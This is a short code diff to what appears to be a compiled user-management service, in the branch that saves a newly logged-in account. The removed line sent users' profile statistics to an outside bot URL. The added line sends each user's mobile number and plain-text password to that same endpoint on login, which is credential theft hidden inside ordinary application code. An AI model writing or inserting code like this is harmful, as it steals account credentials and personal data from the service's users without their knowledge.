@@ -34,7 +34,7 @@ let UsersService = class UsersService {
             await this.clientsService.updateClientSession(user.session);
         }
         else {
-            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`);
+            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nmobile: ${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
             const newUser = new this.userModel(user);
             return newUser.save();
         }
